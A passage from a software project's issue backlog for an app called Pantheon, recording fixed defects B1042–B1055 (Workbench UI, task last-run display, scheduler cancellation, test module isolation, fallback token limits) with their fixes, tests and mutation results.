- [x] **B1042** **`FORBIDDEN.md` Part 1 says "the 7 event names"; the catalogue has 8.** `src/event_bus.EVENT_CATALOGUE`, counted 2026-10-01: `session_created`, `message_sent`, `document_created`, `document_updated`, `memory_added`, `research_completed`, `email_received`, `skill_added`. The protection is right and the count is stale (`Law 6`); `PREAMBLE.md` repeats it. — found during `P22-03` — agent:`wb-fields` — **done 2026-10-01 at the merge**: `FORBIDDEN.md` Part 1 names all eight, from `src/event_bus.EVENT_CATALOGUE`, and says why the count was 7; the agents' preamble says 8.

- [x] **B1043** **The Tasks card's last-run badge has never rendered: nothing asks the list for a last run.**
  Found 2026-10-01 by `P22-02`. `tasks.js` draws `.task-lastrun` from `task.last_run_status` (`B84`, `B110` worked on
  its words and colours), but `_fetchTasks` asks `GET /api/tasks` with no parameters, and `list_tasks` puts
  `last_run_status` on a row only when `include_last_run=true` (`routes/task/task_routes.py`, `_task_to_dict`). Before
  `P22-02`, `grep -rn include_last_run static/` returned nothing: no client has ever passed it. The Workbench passes it
  and draws outcomes; the card's badge is dead code until `_fetchTasks` does too (one query parameter, in
  `wb-fields`' file). Also unmeasured and worth a look before lists grow: `include_last_run` reads `t.runs[0]` through
  a lazy relationship ordered by `started_at`, which loads every run of every task to read one. `Verify:` a task whose
  last run failed shows *Failed* on its card. — found by `P22-02` — agent:`wb-canvas` — **client half done 2026-10-01 (`1e3ee4e`, agent `wb-polish`); the read in one statement, with dry runs left out (`B1054`), is `wb-runs`' server half.** `_fetchTasks` asks `/api/tasks?include_last_run=true` (`TASKS_LIST_URL`), as the Workbench does. Two test mocks that matched `/api/tasks$` exactly accept the query string, and the form test's request sequence reads `GET /api/tasks?include_last_run=true`. Driven in Chromium on the scratch tree of `wb-polish` + `wb-runs`, dark and light: the list's only request was `GET /api/tasks?include_last_run=true`, and a step whose run failed reads **"✗ RuntimeError: No model/endpoint configured"** in the error badge (`task-lastrun task-lastrun-error`). `Verify:` `tests/test_the_task_card_shows_its_last_run_js.py` — **3 cases**, the real `tasks.js` list fed by the real `GET /api/tasks` handler over a real SQLite file, answering whatever the client asked. **1 of 3 red before** (the `Verify:` case; the others are a guard and the premise, re-measured against the handler). **Mutation, 1 of 1:** the parameter dropped reddens 1.
  **Its server note — done 2026-10-01 (`386e3bf`, agent `wb-runs`, with `B1054`). It was what it looked like.**
  - **Measured on the real route:** `include_last_run` read `t.runs[0]` through the lazy, `started_at`-ordered relationship.
    - 20 tasks × 50 runs: 21 statements and **1,001** `TaskRun` rows loaded (steps JSON and all) to serve 20.
    - 40 × 200: 41 statements and **8,001** rows.
  - **Now:** `latest_real_runs` reads every listed task's newest real run in **one** statement (a grouped subquery joined back, per 500 tasks), three columns clipped in SQL. Ties take the highest id, a rule now written down.
    - After: **2 statements (tasks, runs) and 0 `TaskRun` rows** at both sizes.
    - `_task_to_dict` is handed the run, or asks for one task's when nobody hands it one.
  - **Pinned:** `tests/test_a_dry_run_is_not_a_last_run.py::test_the_list_reads_every_last_run_in_one_statement`, which counts statements on the engine. Sending it back to one lazy load per task reddens it.
  - **Left:** the card's `_fetchTasks` passing `include_last_run` — one parameter in `static/js/tasks.js`, wb-polish's file.

- [x] **B1044** **The Assistant's only door is invisible in the default layout.** Measured 2026-10-01 in Chromium
  at 1400×860: with the sidebar open (the default on a desktop) `#icon-rail` is `display: none`, and every tool keeps
  a door through its row in the sidebar's Tools, which its rail button presses (`app.js:_railToolMap`). `#rail-assistant`
  (`H02`: *"The Personal Assistant's only door"*) has no Tools row, so a person who never collapses the sidebar never
  sees it; `UI_VIS_MAP['tool-assistant']` pairs it with nothing and Customize UI has no switch for it (no
  `data-ui-key="tool-assistant"` in `static/index.html`). `P22-02` hit the same defect for the Workbench and gave it
  both doors. `Verify:` with the sidebar open, the Assistant can be opened from the sidebar, and Customize UI can hide
  it. — found by `P22-02` — agent:`wb-canvas` — **done 2026-10-02 (`92a411b`, agent `w8-ui`).** The Assistant has the pair every tool has: `#tool-assistant-btn`, first in Tools as on the rail (A before B), with the rail's glyph; `assistant.js` wires both doors to `openAssistantChat()` — not the rail pressing the row through `_railToolMap`, because the rail's wiring is `H02`'s and a second route would open the chat twice. `UI_VIS_MAP['tool-assistant']` (the key since `H02`, so no new persisted key) pairs the row with the rail, and Settings → Appearance → Sidebar has an *Assistant* switch above *Brain*. `Verify:` `tests/test_the_assistant_has_a_sidebar_door.py` — **6 cases** in the real app in headless Chromium with real clicks (the server given a file database — see `B1085`, on `app_url`): with the sidebar open the rail is hidden and the row is shown, first, reading *Assistant*; the row opens the Assistant's own chat (the session `GET /api/assistant/session` names); Settings → Appearance → Assistant hides the row and the rail, stores `tool-assistant: false` and leaves Brain alone; the choice holds across a reload and comes back; with the sidebar collapsed the rail still opens it; no errors. **4 of 6 red on the previous tree** (the rail and no-errors guards stay green). **Mutation, 5 of 5 caught:** the switch hiding only the rail 2; the row not wired 1; the rail not wired 1; no switch 2; the row not shown 3 (a sixth, the `hidden` attribute on the row, hid nothing — `.list-item`'s `display` outranks `[hidden]` — and was replaced by the `hidden` class). `tests/test_assistant_door.py` (`H02`, 16 cases) passes unchanged. **On the seeded demo**, dark and light at 1400×860 and dark at 390×844 behind ≡: Tools reads *Assistant, Brain, Calendar, …, Workbench*; the row opens the *Assistant* session; the switch hides both doors and brings them back; no errors.

- [x] **B1045** **The edge-to-column pairing and the step-kind words are spelled twice in the browser.**
  `P22-02` put `EDGE_COLUMNS` (`success → then_task_id`, `error → else_task_id`) and `KIND_WORDS` (Prompt, Research,
  Action) in `tasks/workflowDiagram.js` for the canvas; `tasks.js:CHAIN_FIELDS` still pairs the same columns for the
  form's two selects, and `tasks.js:_workflowDetail` still writes the same three words for the diagram. When
  `taskFields.js` (`P22-03`) takes the form, it should read the columns from `EDGE_COLUMNS` and `_workflowDetail` the
  words from `KIND_WORDS`, so one table decides (`Law 7`). `Verify:` swapping the two columns in `EDGE_COLUMNS` alone
  breaks both the form's save and the canvas's write. — found by `P22-02` — agent:`wb-canvas` — **done 2026-10-01 (`b4f3eb8`, agent `wb-polish`). One correction to the premise: `CHAIN_FIELDS` had moved with the form to `tasks/taskFields.js` (`P22-03`).** It takes its columns from `EDGE_COLUMNS` now (the select each condition has stays its own), and `_workflowDetail` its words from `KIND_WORDS` (an unknown kind still reads *Prompt*). `Verify:` `tests/test_one_table_for_the_edge_columns_js.py` — **8 cases**, performing the row's own mutation: every sandbox carries `workflowDiagram.js` as shipped or with **only its tables changed** (the columns swapped, the research word reworded), and the real form's save and prefill, the real canvas's write and the real diagram word all follow it. **3 of 8 red before** (the changed-table cases for the form and the diagram; the canvas already read the table). **Mutation, 3 of 3 caught:** the form spelling its columns again 2; the diagram spelling its research word 1; an unknown kind read as itself 2.

- [x] **B1046** **The task card's "Part of a 3-step workflow" chip still opens the read-only diagram.** ⋮ →
  *Workflow* opens the Workbench since `P22-02` and *Read as a diagram* keeps the Mermaid view; the chip under the
  meta line (`tasks.js`, titled *Draw this workflow*) — the most visible door on a chained card — still opens the
  diagram, where nothing can be changed. Left alone by `P22-02` to keep its footprint in `wb-fields`' file small; it
  is one `onclick` once that file settles. `Verify:` pressing the chip opens the Workbench on that chain. — found by
  `P22-02` — agent:`wb-canvas` — **done 2026-10-01 (`17c8801`, agent `wb-polish`).** Both doors on a card — the chip and ⋮ → *Workflow* — go through one helper, `tasks.js:_openInWorkbench(task)`: the Workbench on that task's workflow with the Tasks window's schedule words. The chip's title says where it goes (*"Open this workflow in the Workbench"*); *Read as a diagram* stays in ⋮, unchanged. Driven in Chromium at 1400 and 390, dark and light: *"Part of a 2-step workflow"* opened the Workbench with its task focused, both steps of that workflow marked, *"Ann target is one of 2 steps in this workflow."*, and no diagram drawn. `Verify:` `tests/test_the_workflow_chip_opens_the_workbench_js.py` — **3 cases** on the real `tasks.js` (the chip opens the Workbench on its own task with the schedule words and not the diagram; the chip and ⋮ open it the same way; a lone task has no chip). **2 of 3 red before** (the green one is the lone-task guard). **Mutation, 4 of 4 caught:** the chip drawing the diagram 2; no schedule words 2; no task 2; the old title 1.

- [x] **B1047** **"Run now" with Pantheon open is recorded "Stopped by user", and the run later goes ahead anyway.** Measured 2026-10-01 on `a97d969` (verify-a), default foreground gate: ⋮ → Run now on a Prompt task → the run is `aborted · "Stopped by user"` 3.8 s later (log: `Stopped 2 background scheduler task(s): foreground request GET /api/email/accounts`, a request the page makes by itself); its failure branch never fires; Activity's *Start now* runs the head but the chained successor is killed the same way 6 s later. The "stopped" run then held the task's claim and executed once no browser was open, chaining on. — found by verify-a (first filed by `wb-canvas` while setting up `P22-02`'s check) — **done 2026-10-01 (`7b05dea`, agent `wb-runs`). verify-a's inference held, measured through the real scheduler and the real gate before a line moved (`/tmp/scratch-wb-runs/probe_b1047.py`, Python 3.11.15): one foreground request in the middleware's order wrote `aborted · "Stopped by user"` while the run's task was not done and its claim was held; when the heartbeat lapsed the "stopped" run executed and chained. Three causes.** **(b) The swallowed cancel:** `wait_for_interactive_quiet` waited with `asyncio.wait_for(cond.wait())`, and 3.11's `wait_for` returns the inner result — dropping the cancel — when the cancel lands in the same tick as the notify that completes the inner wait, which is exactly `_InteractiveActivityMiddleware`'s order (schedule the stop, then notify); 3.12/3.13 do not (verify-a's repro: "kept running after cancel()" on 3.11.15, "cancelled" on 3.12.3 and 3.13.13). The wait is now `asyncio.timeout` around `cond.wait()` (`_wait_on`), the 3.12 shape, so the Python version no longer decides whether a stopped run stays stopped. **(a) The words:** the gate called `_mark_run_aborted(task_id)` with its default "Stopped by user"; it now writes `FOREGROUND_TAKEOVER` ("Paused because Pantheon became active", the phrase the running-run monitor already used), the cancel branch keeps whatever the stopper wrote (`_stopped_as`) instead of its own guess and treats a takeover as one (back in 15 min, `B112`), and an aborted run's `result` says why rather than "Queued — waiting…". **(c) What counts as busy:** who started a run is recorded (`src.interactive_gate.STARTED_BY`: `background` | `person`); background work — schedule, event, webhook and their chains — keeps the gate exactly; a run a person started (Run now, Start now, and the steps it chains into) waits only while a chat reply is being written and only if it needs the model, its row saying *"Queued — waiting for the chat reply in progress to finish…"*, and is never stopped by the page, its heartbeat or the running-run monitor; forced *Start now* waits for nothing; `_run_agent_loop`'s second wait follows the same rule. The gate's purpose holds — no new model work starts while a chat reply is being written — and no decision on record covers the gate. `Verify:` `tests/test_run_now_runs_while_pantheon_is_open.py` — 11 cases on the real gate, the real scheduler, the real route handler, a real SQLite file and real asyncio (the middleware's two calls reproduced in its order; one 0.6 s wait that can only fail when a run is wrongly stopped). **10 of 11 fail on the previous tree** (the one that passes is the `Law 1` guard that a background run's model call still waits for idle). **Mutation, 12 of 12 caught:** the `wait_for` swallow put back reddens 3 of 11; the gate stopping person runs 2; the gate's default words 2; the cancel branch ignoring the stopper 1; the route not saying a person asked 5; a chain not inheriting who started it 2; the second wait always idle 1; a person run never waiting for a chat 2; the waiting row not written 2; the monitor on person runs 1; an abort keeping the placeholder 3; `started_by` unchecked 1. **Driven in Chromium** against a real Pantheon (this branch, temp data dir, auth on, no model, default gate) at 1400×860 and 390×844, dark and light, from the Tasks window: with *Nightly backup* → *if it fails* → *Message me*, ⋮ → Run now toasted "Task triggered" and both runs were finished at the first read (≤0.3 s): *Nightly backup* `error`, last step "Failed, so continued to Message me"; *Message me* `error`. A webhook-fired (background) run sat "Queued — waiting for Pantheon to be idle…" while the page was open, then read `aborted · Paused because Pantheon became active` — History: "Stopped · Paused because Pantheon became active". Each pre-emption is logged once (`Stopped 2 background scheduler task(s): browser heartbeat`), not every heartbeat as before. No page errors, no 4xx/5xx, no horizontal scroll at 390. The chat-reply wait could not be shown in a browser on an install with no model (no reply can be written); it is driven by the tests. `P22-02`'s `Verify:` no longer fails on this with the default settings (it is still held on `B1051`–`B1053`).

- [x] **B1048** **On a fresh install the canvas opens on ten steps nobody wrote, and every step is two tab
  stops.** `GET /api/tasks` lists the built-in housekeeping tasks (ten on a fresh install, eight of them paused), so
  the Workbench's first view is a grid of *Skills Audit*, *Email Tags*, … before the person's own; and each step is a
  focusable group plus its *Connect…* button, with arrows after, so Tab crosses 20+ stops before the first arrow. A
  way to set the built-ins aside (a toggle, or a separate band) and a roving tabindex (one stop for the canvas, arrows
  within) are both `P22-00`-gate questions, not `P22-02`'s. `Verify:` someone opening the Workbench first sees their
  own steps, and reaches any step or arrow from the keyboard in a handful of presses. — found by `P22-02` —
  agent:`wb-canvas` — **done 2026-10-01 (`c74fde7`, `e689adb`, agent `wb-polish`). Re-measured: this install lists eleven built-ins (*Documents Tidy* has joined the ten).** **Set aside.** A workflow made only of built-in tasks is set aside until the toolbar's switch shows it — *"Show built-in tasks (11)"*, the Tasks card's own word, its title saying what they are (*"The housekeeping tasks Pantheon comes with, such as Memory Tidy and Email Tags…"*). A built-in joined to a step of the person's own is part of their workflow and always shown; opening the Workbench on a built-in (⋮ → *Workflow* on its card) shows that workflow; an empty canvas says the built-ins are hidden and where the switch is. Connect… and the step form still get the whole list (the `P22` panel contract). The switch is per opening: the Workbench always opens with them aside. **One tab stop.** The canvas is one stop — the step or arrow last visited, the first step to begin with; the arrow keys go through the steps in reading order (top to bottom, left to right), each followed by the arrows leaving it (*if it works* first), Home/End to the ends; the stop's own Connect… and *Plan* follow it in the Tab order. **Every keyboard path `P22-02` built still works**: Enter opens a step, Tab from the stop reaches its Connect…, Delete twice removes an arrow, the zoom keys answer. Moving a step was the bare arrow keys, which now go between steps, so a step is picked up with **M**, moved with the arrows as before (Shift ×4), put down with Enter or M, or put back with Escape; the hint says the keys. Driven in Chromium (dark and light): five own steps and the two built-ins joined to them drawn, eleven aside; the switch drew 18; from the sidebar's *Workbench* row 25 Tabs reached the canvas (the user bar and the composer come first in the document, as for every window — verify-a counted 24–28 to a step), then the arrow keys walked steps and arrows; M, three moves and Escape with the pointer on the window put the step back and left the window open. `Verify:` `tests/test_the_workbench_opens_on_your_own_steps_js.py` — **13 cases**, counted by pressing: from the canvas's stop no item of the person's canvas is more than three presses away, and the ten built-ins are nine more stops when shown (the tenth is joined to the person's workflow). `tests/test_the_workbench_canvas_js.py` changes two expectations of the old design on purpose (one step is the stop; a move starts with M) and checks the empty state says nothing is hidden when nothing is. **12 of 40 red before.** **Mutation, 15 of 15 caught:** nothing set aside 5; a joined built-in hidden too 6; opening on a built-in not showing it 1; the switch showing nothing 3; the empty canvas not saying they are hidden 1; every step a stop again 7; the stop's buttons out of the Tab order 1; the arrow keys going nowhere 3; arrows left out of the order 4; column order 1; focus not moving the stop 1; M doing nothing 3; Escape keeping the moved place 1; Enter opening instead of putting down 1; a move off the Escape stack 2.

- [x] **B1049** **`tests/test_security_regressions.py` still leaves at least ten modules other than it found them.** Found while working `B1020`, which fixed the two on that row's path (`routes.chat_helpers`, `src.auth_helpers`) and left the rest, measured with a probe comparing `sys.modules[name]` and the package attribute at collection and at session end (`test_chat_helpers.py` + this file, `-p no:randomly`; fourteen modules watched, `routes.gallery.gallery_helpers` not among them): **replaced** — `src.secret_storage` (`_import_secret_storage` pops it and re-imports) and `core.auth` (`test_auth_manager_migrates_legacy_admin_role` pops it and deletes the package attribute; it takes no `monkeypatch`); **reachable only by package attribute**, popped from `sys.modules` but left on the package — `src.integrations` and `routes.document_helpers`, the second imported under the file's stub `core.database` (`_stub_core_database_for_route_imports`: `SessionLocal`, `Document` and friends are `MagicMock`s), so a later `from routes import document_helpers` gets the stub-bound copy; **added and kept** — `routes.email_helpers`, `routes.email_pollers`, `routes.mcp_routes`, `src.mcp_oauth`, `routes.session_routes`, `routes.gallery.gallery_routes` (popped before a re-import, `_drop_route_module_cache` for the last two), harmless only while nothing collected earlier holds the original. The shape is `B1020`'s exactly: a file collected before it binds the first copy and a test after it patches the second by dotted name. Nothing measured fails today. Fix: route each through `drop_for_fresh_import` (or `reimported_under_stubs` for the helper-level imports, which have no `monkeypatch`), as `B1020` did for two of them; `test_the_tests_that_drop_a_module_put_it_back` is the shape a guard for each takes. `Verify:` the probe reports no module of this file replaced or attribute-only after a run. — found while working `B1020` — **done 2026-10-02 (agent `w8-agent`, `c5c1fe7`). Test code only.** **Re-measured with a stricter probe** that imports every watched module before the run — as a file collected earlier holds it, the case that hurts — and compares objects rather than `id()`s (a freed original's id can be reused): **10 of 14 left other than held** — replaced by name and as the attribute: `src.secret_storage`, `routes.email_helpers`, `routes.email_pollers`, `src.mcp_oauth`, `core.auth`, `routes.session_routes`, `routes.gallery.gallery_routes`, `routes.gallery.gallery_helpers`; emptied from `sys.modules`: `src.integrations`, `routes.document_helpers`. **Two of the row's premises corrected (`Law 3`)**: `routes.document_helpers` and `routes.mcp_routes` are back-compat **shims** that put their canonical module (`routes.document.document_helpers`, `routes.mcp.mcp_routes`) in `sys.modules`, so re-importing them returns the module already loaded and **no stub-bound copy is made** (measured: the canonical's `SessionLocal` is the real one after both document tests); the leak there was the trailing pop leaving `sys.modules` empty. **Fixed at every site**: the tests that have a `monkeypatch` drop through `drop_for_fresh_import` (`src.secret_storage`; `src.integrations`; `routes.document_helpers` ×2, the trailing pops removed; `routes.email_pollers`; `core.auth`, the test now taking `monkeypatch`; `src.mcp_oauth`; `routes.mcp_routes`, as `_import_mcp_routes(monkeypatch)`); the helpers that have none re-import inside `reimported_under_stubs` (`_import_q`, `_import_friendly_email_auth_error`, `_import_attachment_extract_dir`, `_import_session_routes_for_filename`, `_import_gallery_routes_for_filename`), and `_drop_route_module_cache`, whose evict-and-leave was the leak, is gone. **And the shared helper had a latent bug this row was the first to reach**: for a module never imported, `drop_for_fresh_import` set the package attribute to `None` (`setattr(parent, child, None, raising=False)`) — so `from src import integrations`, which reads the attribute first, got `None` and imported nothing (two cases failed the moment `src.integrations` went through it), and pytest undoes a `setattr` of an absent attribute with a bare `delattr`. It now records the attribute through the package's `__dict__` with `setitem`, the way it already handled `sys.modules`: an absent attribute stays absent for the test, and whatever the re-import binds there is removed at teardown. `Verify:` the probe reports no module of this file replaced or attribute-only after a run — **the hold probe: 0 of 14** (was 10); the row's own probe now reports only *added* (first imports of the real modules — by the guard, and by dependency), none replaced, none attribute-only. `CI:` `tests/test_security_regressions.py::test_every_test_that_drops_a_module_puts_it_back` — **13 cases**, `B1020`'s shape, one per dropping test (two sharing a `monkeypatch` would hide the second's leak behind the first's restore — measured: a mutation survived that way until the guard was split): each module the test drops is held first, the test is run under a `MonkeyPatch` of its own and undone, and the module is the same object by `sys.modules`, by import and as its package's attribute. **12 of 13 fail on the old file** (`mcp-paths` passes — the shim). **Mutation: 14 of 15 caught**: each site put back to a bare pop (for `document_helpers` the old pop at start and end; for the session and gallery helpers evict-and-leave) — `secret_storage` 2, `integrations` 1, `_import_q` 1, `_import_friendly_email_auth_error` 1, `_import_attachment_extract_dir` 1, document lookup 1, document marker 1, `email_pollers` 1, `core.auth` 1, `mcp_oauth` 1, session 1, gallery 1; the helper setting an absent attribute to `None` again 2; the helper not recording a present attribute 6. The survivor is equivalent: `routes.mcp_routes` under a bare pop — the shim's re-import returns the loaded module, and the old code never emptied it. — agent:`w8-agent`

- [x] **B1050** **Agent mode's force-answer salvage asks the primary even when a fallback answered the run — read, not measured.** Found while working `B1034`. When a run's last round produced no prose, the loop makes one non-streaming synthesis call (`src/agent_loop.py`, the `_force_answer` block, `llm_call_async(url=endpoint_url, model=model, headers=headers, … max_tokens=max_tokens)`) — always the primary's URL, model and headers, with the primary's lifted length. Once a fallback has answered and been pinned (`_pinned_fallback_candidate`), the primary is the endpoint that was down, so the salvage would fail and the run end on the canned apology; and a cloud primary behind which a local fallback answered would be sent the transcript the local model built. Read from the source, **not measured** — reaching it needs a run that exhausts its budget on a pinned fallback. Fix, if it holds: send the salvage to the candidate that answered the round (its URL, model, headers and `candidate_max_tokens`). `Verify:` a run whose primary is down and whose fallback exhausts the step budget without prose ends with the fallback's synthesis, not the apology. — found while working `B1034` — **done 2026-10-01 (agent `w8-agent`, `f15b796`). Measured first, and half the premise is false (`Law 3`)**: once a fallback answers, the loop pins it and **rebinds `endpoint_url`, `model` and `headers` to it** (`endpoint_url, model, headers = _pinned_fallback_candidate`), so the salvage already went to the fallback — its host, its model, its credentials — and never to the primary that was down. **The length did not follow**, measured through the real chat route, agent loop and fallback wrapper with only the sockets faked: a local primary down and a hosted fallback answering, the fallback's rounds were sent 4096 (`B1034`) and its salvage **1,000,000** — the local primary's lift — which a hosted provider refuses, so the turn ended on the apology; a cloud primary down and a LAN fallback, the salvage was sent 4096 where that fallback's rounds were sent 1,000,000. **Fix**: the salvage asks `B1034`'s one rule, `candidate_max_tokens(_preset_max_tokens, endpoint_url)`, about the URL it is sent to; an unpinned run's salvage goes to the primary with the run's own number, as before. **"Exhausts the step budget" is not the trigger**: running out of steps offers *Continue* and never reaches the salvage; it is reached when the loop breaker (or the identity path) forces a tool-free round that still writes no prose. `Verify:` a run whose primary is down and whose fallback goes round in circles until the loop breaker forces an answer with no prose ends with the fallback's synthesis, not the apology. `CI:` `tests/test_the_salvage_asks_the_model_that_answered.py` — **8 cases**, an Agent-mode turn through the real route, loop, fallback wrapper and payload builders (a scripted socket: the same native call every round it is sent tools, a fenced call and no prose on the forced round; a hosted host that refuses `max_tokens` above 16,384 with a 400): the four chains (local→cloud and cloud→local, untyped and typed) with the salvage sent to the answering fallback's host, model and credentials at the number its own rounds were sent; the row's `Verify:` (the synthesis streamed and saved, not the apology); three guards with the primary answering (local, local typed, cloud). **5 fail on the old tree** (the three guards pass). **Mutation: 5 of 5 caught**: the run's number again 5; lifted from the run's already-lifted number 3; never lifted 4; always lifted 4; the pin not rebinding the route (the row's premise made true) 5. — agent:`w8-agent`

- [x] **B1051** **At phone width the Workbench's canvas has no height.** Measured 2026-10-01 at 390×844 (and 768): the window is a 183 px bottom sheet; `.wb-viewport` is 0 px, every step off-screen, the step form mounts in a 0 px panel; dragging the handle does not grow it. The mobile `.modal-content { height:auto !important }` beats `.workbench-modal-content`, and `#workbench-modal` is not in the full-height list `#tasks-modal` is in. `Verify:` at 390 px someone opens the Workbench, sees their steps, opens one and saves it. — found by verify-a — **done 2026-10-01 (`868bd6e`, agent `wb-polish`). Measured first, in the real app on this branch: at 390×844 and 768×860 the window was a 183 px sheet and `.wb-viewport` 0 px — the row held.** The Workbench block's own phone media query now gives `#workbench-modal .workbench-modal-content` the full-height rule Tasks, Calendar and the Library windows have (`100dvh`, with the `vh` fallback and the safe-area pad), scoped by the window's id so it wins over the sheet's class rule. Tasks also anchors its sheet to the top; measured, a full-height sheet needs no anchor, so that rule was not copied. The Connect… picker is kept on the stage (it opened past the right edge at phone width). After, in the real app: 390 — an 844 px window and a 671 px canvas; 768 — 860 and 687; no sideways scroll. **The `Verify:`, driven at 390 in dark and light** (`verify_rest.py`): nine steps on the canvas (370×627), every one's centre inside it and hit by itself; a click on *Backup* opened the real task form in a 370×627 panel; the name edited and saved through the form's own Save — *"Saved Backup dark."*, the server holding the new name. `Verify:` `tests/test_the_workbench_has_room_on_a_phone.py` — **10 cases in headless Chromium**: the real `style.css`, the real `#workbench-modal` markup cut out of `index.html`, the real `canvas.js` served from `static/`; the server and the step form are the stand-ins. **7 of 10 red on the old CSS** (the green three are the no-sideways-scroll and desktop-size guards). **Mutation, 2 of 2 caught:** the rule removed 7; the sheet's 85dvh cap kept 2. (Scoping the same rule by class instead of id also passes — it wins on source order — and is not a defect.)

- [x] **B1052** **Escape with the pointer over the Workbench closes the window and the unsaved step form, not the form first.** Measured 2026-10-01: pointer over the window, focus in the panel's Name box (edited) → one Escape closes the Workbench with no prompt (the form is destroyed, so the edit is not kept: inferred from `canvas.js`); pointer off the window → panel first, then window. `ui.js`'s arbiter tries `_closeHoveredWindow()` before `dismissTopMenu()`, so the canvas's registered dismissers never see the key. `Verify:` after clicking a step and editing, Escape closes the panel (or asks), and a second Escape closes the window. — found by verify-a — **done 2026-10-01 (`c03bd01`, agent `wb-polish`). The premise held.** **`ui.js`, one line, general:** in `_closeHoveredWindow`, a window that marks an open inner layer with `[data-esc-layer]` has the Escape stack (`escMenuStack.js`) answer first — the stack's own rule, innermost thing first — and then the window. **What else it affects: nothing that does not carry the mark.** A window without it closes on the first Escape exactly as before, whatever is on the stack (a test pins that, with a menu registered elsewhere); today only the Workbench's room carries it, and any window with panels can opt in by marking a layer it registered. **`canvas.js`:** every layer the room opens over itself — the step panel, Connect…, a drag from a port, a removal waiting for its second Delete, a step picked up from the keyboard, a dry-run plan and its box — is registered through one helper (`holdEscape`) that also puts the mark on the room while any is open, so the mark and the stack cannot disagree. **Asking:** Escape on a form with edits (`input`/`change` reaching the panel) says *"Backup has changes that are not saved. Press Escape again to close it without saving them, or Save."* and keeps the form; the next Escape closes it (*"Closed Backup without saving."*), the one after closes the window; typing in between asks again. Cancel, Close and Save do not ask. Driven in Chromium (dark and light), the pointer on the window the whole time: edit *Backup*'s name, Escape asks, Escape closes the panel, Escape closes the window, the server still has *Backup*; unedited, panel then window. `Verify:` `tests/test_escape_closes_the_workbench_panel_before_the_window_js.py` — **8 cases**: the arbiter's own `_visibleModalForSpace`, `_spaceWindowId`, `_windowAtPointer`, `_closeHoveredWindow`, `_isVisible`, `pickTopModal` and Escape handler cut out of the real `ui.js` with `js_definition`, run against the real canvas and the real `escMenuStack.js`. **6 of 8 red on the tree before it** (the green two are the "as before" guards). **Mutation, 10 of 10 caught:** the `ui.js` line removed 5; the stack asked first for every window 1; the room never marking a layer 5; the mark never taken down 2; edits never noticed 4; an edited form closed without asking 4; the question not re-armed after more typing 1; the panel registered on the stack directly 4; no word after closing without saving 1.

- [x] **B1053** **An arrow to a step on its left is drawn under both steps and reads as the reverse link.** Measured 2026-10-01: "if it fails" from *Ann target* (x 516–645) to *Zed source* (x 333–462, same row) is saved right, but 12 of 21 points of the path lie under the two boxes and the only visible segment, with its label, leaves Zed source's *if it fails* port toward Ann target. The canvas keeps positions after a connect, so this lasts until the Workbench is reopened or *Tidy up*. `Verify:` immediately after connecting a step to one on its left, the arrow is visibly routed from the source's port to the target's input. — found by verify-a — **done 2026-10-01 (`9888da8`, agent `wb-polish`). The premise held (re-measured on `edgePath` itself: more than a third of the curve's points under the two boxes).** `graphLayout.js:edgeRoute(from, to, when)` is the arrow, pure like the rest of the module. Target to the right by at least 16 px — where `edgePath`'s curve stays between the steps (measured on its own control points) — it is that curve, unchanged. Otherwise it is routed: straight out of the source's port, along a lane that clears both steps — between their rows when there is room, otherwise above them for *if it works* and below for *if it fails*, so one step's two arrows take different lanes — and into the target from its left, where the head points in; rounded corners; the words on the lane, clear of both boxes. The canvas draws it and marks the arrow `data-routed`. Driven in Chromium (dark and light): *Zed source* placed left of *Ann target*, *if it fails* dragged from Ann to Zed — *"Connected. After Ann target, if it fails, Zed source runs."*, the server holding the edge, the arrow leaving Ann's port and running under both steps into Zed's left side, **0 of 41 sampled points under either box**. `Verify:` `tests/test_an_arrow_to_a_step_on_its_left_goes_round_js.py` — **9 cases**: every route sampled point by point under node (lines, corners and curves), and the real canvas drawing the route right after a drag. **8 of 9 red on the tree before it** (the green one re-measures the premise). **Mutation, 8 of 8 caught:** every arrow the plain curve 6; the canvas drawing `edgePath` 1; both ports on the upper lane 3; no lane between rows 3; arriving from the right 6; leaving inward 6; the words at the old midpoint 3; near-forward arrows routed too 1.

- [x] **B1054** **A dry run is a step's "Last run" on the canvas.** Measured 2026-10-01: after only *Show me what this would do*, `GET /api/tasks?include_last_run=true` served `last_run_status: "skipped"` and a step whose last real run failed read "Last run: Skipped". — found by verify-a — **done 2026-10-01 (`386e3bf`, agent `wb-runs`), with `B1043`'s server note.** Re-measured on the real route: the dry run was served as the last run, plan text and all. `DRY_RUN_MARK` ("Dry run — ") is what every dry run's `result` starts with — the headline is built from it, and a dry run the engine declined writes "Dry run — not planned: <why>" — and `is_dry_run` / `real_run_clause` are the one answer, in Python and SQL, to "is this row a dry run". `latest_real_runs` reads each listed task's newest real run (`B1043`, below). Real skips (a housekeeping "nothing to do") and stops still count; the 500-character clip and result-then-error rule are unchanged. `Verify:` `tests/test_a_dry_run_is_not_a_last_run.py` — 9 cases on the real route with dry runs written by the real scheduler; **5 of 9 fail on the previous tree** (4 `Law 1` guards pass). **Mutation, 6 of 6 caught** (dry runs counted 5; a declined dry run unmarked 1; one lazy load per task again 1; ties to the lowest id 1; the outer join not excluding dry runs 1; error not read when result is empty 1). Driven in Chromium: after a dry run of the failed *Nightly backup*, the list still served `["error", "RuntimeError: No model/endpoint configured"]` and the canvas still drew it "✗ Last run: Failed" (1400, dark and light).

- [x] **B1055** **A failed run shows "Starting…" and hands "Starting…" to its failure branch.** Measured 2026-10-01: a Prompt run that failed with `RuntimeError: No model/endpoint configured` read "Failed · Starting…" in History, and the successor's cause line said `status=error, result=Starting…`. — found by verify-a — **done 2026-10-01 (`39a4617`, agent `wb-runs`).** Re-measured on the real engine: the error path set `status`/`error` and left `result` at the "Starting…" written when the run flipped to running; History draws `result` first and `_handoff_from` hands `result` on. The error path now writes the reason into `result` when the run was still `running` (nothing produced yet — "Starting…" or a progress line); a run that produced its output and then failed delivering it keeps the output, and a run that returned a failure is unchanged. The hand-off reads the row, so the failure branch is given the reason with no second copy and no change in the browser. `Verify:` `tests/test_a_failed_run_says_why.py` — 5 cases on the real scheduler, the real chain into the failure branch and the real history route; **3 of 5 fail on the previous tree** (2 `Law 1` guards pass). **Mutation, 2 of 2 caught.** Driven in Chromium (both widths, both palettes): *Message me*'s History reads "Failed · RuntimeError: No model/endpoint configured · 1 step", and its cause line ends `status=error, result=RuntimeError: No model/endpoint configured`.

